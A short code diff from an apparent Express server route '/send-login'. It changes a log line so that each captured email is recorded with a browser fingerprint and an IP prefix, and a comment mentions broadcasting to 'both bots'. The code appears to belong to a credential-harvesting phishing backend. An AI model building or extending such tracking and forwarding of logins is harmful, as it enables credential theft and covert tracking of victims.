@@ -270,7 +270,7 @@ app.post("/send-login", async (req, res) => {
       ipToEmail[ip] = email;
     }
 
-    console.log(`📧 ${email} has been directed to: Page 1`);
+    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
